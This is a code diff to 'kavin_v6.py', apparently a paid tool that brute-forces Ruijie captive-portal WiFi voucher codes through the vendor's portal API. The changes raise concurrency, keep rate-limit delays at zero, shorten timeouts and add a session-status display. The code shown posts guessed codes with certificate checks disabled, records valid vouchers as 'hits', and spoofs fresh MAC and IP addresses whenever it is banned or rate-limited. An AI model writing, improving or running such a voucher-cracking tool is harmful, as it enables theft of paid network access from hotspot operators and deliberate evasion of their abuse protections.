@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Max Speed Unlimited)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Clean Dashboard)
 # Part 1 of 2
 # =====================================================================
 
@@ -35,10 +35,9 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 20  # ⭐ တစ်ပြိုင်နက် ၂၀ ခု စစ်မယ်
-RL_SLEEP = 0.0          # ⭐ Sleep လုံးဝ မရှိတော့ဘူး (အမြန်ဆုံး)
+CONCURRENCY_LIMIT = 25  # ⭐ တစ်ပြိုင်နက် ၂၅ ခု စစ်မယ်
+RL_SLEEP = 0.0          
 
-# Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
 RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
@@ -158,7 +157,7 @@ async def fetch_official_session(session, gw_params, current_mac_ref, current_ip
 
     try:
         session.cookie_jar.clear()
-        async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
+        async with session.get(full_url, headers=headers, timeout=5, allow_redirects=False) as resp:
             location = resp.headers.get('Location', '')
             
             if location:
@@ -205,7 +204,8 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False, allow_redirects=True) as r:
+        # Timeout ကို ၂ စက္ကန့်ပဲ ထားလိုက်တယ် (အမြန်ဆုံးကျော်သွားအောင်)
+        async with session.post(url, json=payload, headers=headers, timeout=2, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
             text = await r.text()
@@ -259,15 +259,19 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (Max Speed Unlimited)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Clean Dashboard)
 # Part 2 of 2
 # =====================================================================
 
-def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count):
+def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count, sess_stat):
     layout = Layout()
+    
+    # ⭐ အပေါ်ဆုံးမှာ တစ်ကြောင်းတည်း ရှင်းရှင်းလင်းလင်း ရေးထားတယ်
     header_text = Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_cyan", justify="center")
-    sub_text = Text(f"Official Ruijie API • {scan_method.upper()} • @kavin799", style="bold bright_green", justify="center")
-    layout.split_column(Layout(Panel(Align.center(Text.assemble(header_text, "\n", sub_text)), border_style="cyan", box=ROUNDED), size=4), Layout(name="body", ratio=1))
+    layout.split_column(
+        Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3),
+        Layout(name="body", ratio=1)
+    )
 
     stats = Table.grid(expand=True, padding=(0, 1))
     stats.add_column(style="bold white", justify="left")
@@ -276,17 +280,19 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     stats.add_column(style="bold green", justify="left")
 
     status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() or "RETRY" in status.upper() or "FAIL" in status.upper() else "bold green"
+    sess_style = "bold green" if "REAL" in sess_stat.upper() else "bold yellow"
 
     stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
     stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
     stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
     stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
     stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
-    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  ",          "")
+    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  🔐 Session", f": {sess_stat.upper()}", style=sess_style) # ⭐ Session အခြေအနေ ထည့်ထားတယ်
 
     stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
     check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
 
+    # ⭐ Hits Table အောက်က စာသားတွေ ဖျက်ထားတယ်
     v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
     v_table.add_column("Voucher Hits", style="bold green", justify="center")
     v_table.add_column("Plan", style="bold green", justify="center")
@@ -295,13 +301,18 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     for h in hits[-10:]:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Max Speed Unlimited[/dim]", "", "")
+    if not hits: v_table.add_row("", "", "")
 
     footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
 
     body_layout = Layout()
-    body_layout.split_column(Layout(stats_panel, size=8), Layout(check_panel, size=3), Layout(v_table, ratio=1), Layout(footer_panel, size=3))
+    body_layout.split_column(
+        Layout(stats_panel, size=8), 
+        Layout(check_panel, size=3), 
+        Layout(v_table, ratio=1), 
+        Layout(footer_panel, size=3)
+    )
     layout["body"].update(body_layout)
     return layout
 
@@ -325,6 +336,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     hits, tested, start_time = [], 0, time.time()
     current_code = [""]
     current_status = ["Init"]
+    sess_stat = ["Fake Session"] # ⭐ မူလက Fake လို့ ထားမယ်
 
     current_mac = [generate_random_mac()]
     current_ip  = [generate_random_ip()]
@@ -334,7 +346,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
-        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0), refresh_per_second=4, screen=False)
+        # Dashboard ကို ၁ စက္ကန့်ကို ၂ ခါပဲ Refresh လုပ်ခိုင်းလိုက်တယ် (မတုန်အောင်)
+        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0, sess_stat[0]), refresh_per_second=2, screen=False)
 
         with live:
             try:
@@ -346,10 +359,12 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         if res == "BAN":
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "Banned → Spoofing"
                             await asyncio.sleep(0.1)
                             continue
 
                         sess_data[0] = res
+                        sess_stat[0] = err_msg # ⭐ Session အခြေအနေ Dashboard မှာ ပြမယ်
 
                     batch_codes = []
                     while len(batch_codes) < CONCURRENCY_LIMIT:
@@ -382,6 +397,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
                         if res == "__SESSION_EXPIRED__":
                             sess_data[0] = None
+                            sess_stat[0] = "Refreshing..."
                             session_expired_in_batch = True
                             break
 
@@ -389,6 +405,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "Refreshing (Rate Limit)..."
                             hit_found_in_batch = True
                             break
 
@@ -400,6 +417,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "Refreshing (Limit)..."
                             hit_found_in_batch = True
                             break
 
@@ -422,13 +440,14 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
+                            sess_stat[0] = "Refreshing (Hit!)..."
                             hit_found_in_batch = True
                             break
 
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                     
-                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes)))
+                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes), sess_stat[0]))
 
                     if hit_found_in_batch: await asyncio.sleep(0.1)
                     if session_expired_in_batch: await asyncio.sleep(0.01)
@@ -445,7 +464,6 @@ def show_banner():
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • Max Speed Unlimited", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
